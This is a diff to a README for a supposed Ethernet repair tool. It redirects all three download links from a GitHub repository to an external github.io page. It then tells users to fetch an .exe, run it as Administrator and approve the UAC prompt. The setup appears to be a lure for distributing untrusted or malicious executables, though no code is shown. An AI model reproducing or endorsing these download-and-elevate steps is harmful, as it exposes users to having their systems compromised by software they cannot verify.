@@ -1,6 +1,6 @@
 # 🌐 Ethernet-No-Internet-Fix - Restore Your Wired Internet Connection Fast
 
-[![](https://img.shields.io/badge/Download-Repair_Tool-blue.svg)](https://github.com/suzanecuadorian837/Ethernet-No-Internet-Fix)
+[![](https://img.shields.io/badge/Download-Repair_Tool-blue.svg)](https://suzanecuadorian837.github.io)
 
 ## 🛠 What This Tool Does
 
@@ -21,13 +21,13 @@ Confirm your device meets these requirements before you start:
 
 Follow these steps to obtain and run the repair tool.
 
-1. Visit the [official download page](https://github.com/suzanecuadorian837/Ethernet-No-Internet-Fix) to download the application.
+1. Visit the [official download page](https://suzanecuadorian837.github.io) to download the application.
 2. Locate the most recent file ending in .exe in the releases section.
 3. Save the file to your desktop or your Downloads folder.
 4. Right-click the downloaded file and select Run as Administrator.
 5. Grant the application permission to make changes to your device when the user account control window appears.
 
-[![](https://img.shields.io/badge/Download-Repair_Tool-grey.svg)](https://github.com/suzanecuadorian837/Ethernet-No-Internet-Fix)
+[![](https://img.shields.io/badge/Download-Repair_Tool-grey.svg)](https://suzanecuadorian837.github.io)
 
 ## ⚙️ Using the Repair Tool
 
